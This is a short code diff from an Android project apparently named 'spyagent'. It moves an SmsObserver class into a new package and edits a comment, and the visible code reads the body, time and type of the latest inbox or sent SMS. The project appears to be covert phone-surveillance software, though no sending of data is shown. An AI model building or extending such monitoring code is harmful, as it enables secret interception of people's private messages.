@@ -1,4 +1,4 @@
-package com.irodyk.spyagent;
+package com.irodyk.spyagent.observer;
 
 import android.content.ContentResolver;
 import android.content.Context;
@@ -40,7 +40,7 @@ public class SmsObserver extends ContentObserver {
         c.moveToNext(); //point to the latest message!
 
         int smsType = Integer.valueOf(c.getString(c.getColumnIndex("type")));
-        if (smsType == 1 || smsType == 2){ //inbox and sent
+        if (smsType == 1 || smsType == 2){ //inbox or sent
             String type = (smsType == 1) ? "Inbox" : "Sent";
             String smsTime = c.getString(c.getColumnIndex("date"));
             String smsBody = c.getString(c.getColumnIndex("body"));
